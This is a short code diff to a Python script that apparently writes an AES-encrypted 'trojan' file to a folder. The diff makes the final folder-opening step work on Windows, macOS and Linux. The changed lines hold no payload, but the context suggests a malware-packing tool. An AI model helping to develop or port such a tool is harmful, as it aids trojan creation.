@@ -70,4 +70,8 @@ encrypted_trojan_path = os.path.join(directory_path, os.path.basename(encrypted_
 with open(encrypted_trojan_path, 'wb') as file:
     file.write(encrypted_data_aes)
 
-os.startfile(directory_path)
+if platform.system() == 'Windows':
+    os.startfile(directory_path)
+else:
+    opener = "open" if platform.system() == "Darwin" else "xdg-open"
+    os.system(f"{opener} {directory_path}")
